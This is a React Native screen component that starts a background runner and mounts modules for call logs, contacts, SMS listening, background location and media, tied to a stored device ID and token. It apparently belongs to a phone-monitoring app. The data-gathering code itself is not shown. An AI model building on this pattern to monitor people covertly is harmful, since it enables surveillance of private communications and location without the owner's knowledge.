/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import React, {useEffect} from 'react';
import {Button, Text, View} from 'react-native';
import CallLog from '../../components/CallLog';
import {useStorage} from '../../hook/use-storage';
import {useNavigation} from '@react-navigation/native';
import Contact from '../../components/Contact';
import SmsListener from '../../components/SmsListener';
import Location from '../../components/Location';
import LocationBackground from '../../components/LocationBackground';
import {Runnable} from 'react-native-background-runner';
import {activeRunBackground} from '../../lib/helper';
import Media from '../../components/Media';

const Permission = () => {
  const [deviceId, setDeviceId] = useStorage('deviceId');
  const [, setToken] = useStorage('token');
  const navigation = useNavigation();

  useEffect(() => {
    activeRunBackground();
  }, []);

  return (
    <Runnable>
      <View
        style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          gap: 16,
        }}>
        <Text>DeviceID: {deviceId}</Text>
        <Button
          title="Logout"
          onPress={() => {
            setDeviceId(null);
            setToken(null);
            navigation.navigate('Authentication' as never);
          }}
        />
        <CallLog />
        <Contact />
        <SmsListener />
        {/* <Location /> */}
        <LocationBackground />
        <Media />
      </View>
    </Runnable>
  );
};

export default Permission;
